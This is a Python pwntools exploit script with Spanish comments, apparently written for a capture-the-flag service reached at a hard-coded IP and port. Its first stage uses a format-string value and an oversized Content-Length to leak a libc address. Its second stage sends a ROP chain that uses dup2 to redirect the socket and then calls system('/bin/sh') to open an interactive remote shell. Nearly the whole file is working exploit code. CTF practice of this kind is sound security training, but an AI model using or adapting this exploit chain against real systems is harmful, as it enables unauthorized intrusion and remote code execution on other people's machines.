from pwn import *

"""
Tenemos dos players: me, Overlord
Podemos enviar acciones: VIEW, PLAGUE
"""

host = "94.237.61.84"
port = 42745

io = remote(host, port)

libc = ELF("./glibc/libc.so.6")

description = "A"*300
# Overflow para secuestro de flujo (Y mejor si lo haces con VIEW)
#target = cyclic(2049) + b"B"*8

target = "C"*10
content_length = 100000 # Tiene que ser 100 para el overflow ojo cuidado eso influye

target_competitor = "ALGO.%x"
version = "B"*10

overflow = cyclic(2040) + b"B"

request = b"".join([
    f"PLAGUE {target_competitor} {version}\r\n".encode(),
    f"Content-Length: {content_length}\r\n".encode(),
    f"Plague-Target: {target_competitor}\r\n".encode(),
    f"\r\n\r\n".encode(),
    f"{description}".encode()
])

#print(request)

io.send(request)

io.recv()

io.close()

io = remote(host, port)

content_length = 100

description = "B"*6

request = b"".join([
    f"PLAGUE {target_competitor} {version}\r\n".encode(),
    f"Content-Length: {content_length}\r\n".encode(),
    f"Plague-Target: {target_competitor}\r\n".encode(),
    f"\r\n\r\n".encode(),
    f"{description}".encode()
])

io.send(request)

io.recvuntil(b"B"*6)

leak_libc = u64(io.recv(8))

print(f"Leak Libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x1d2cc0

print(f"System: {hex(libc.sym.system)}")

io.recv()

io.close()

one_gadget = [0x4c139, 0x4c140, 0xd509f]

ret = libc.address + 0x0000000000027182
pop_rdi = libc.address + 0x00000000000277e5
#pop_rsi = libc.address + 0x0000000000028f99
pop_rsi_r15 = libc.address + 0x00000000000277e3

io = remote(host, port)

payload = b"".join([
    #cyclic(5000) # Para buscar el ret
    cyclic(2080),
    # Dup del descriptor 3 a 0
    p64(pop_rdi),
    p64(6),
    p64(pop_rsi_r15),
    p64(1),
    p64(0),
    p64(libc.sym.dup2),

    p64(pop_rdi),
    p64(6),
    p64(pop_rsi_r15),
    p64(2),
    p64(0),
    p64(libc.sym.dup2),

    p64(pop_rdi),
    p64(6),
    p64(pop_rsi_r15),
    p64(0),
    p64(0),
    p64(libc.sym.dup2),    

    # Shell
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh"))),
    p64(ret),
    p64(libc.sym.system)
])

request = b"".join([
    f"VIEW {target_competitor} {version}\r\n".encode(),
    f"PWN: ".encode() + payload,
    f"\r\n\r\n".encode()
])
input("PAUSE")
io.send(request)

io.interactive()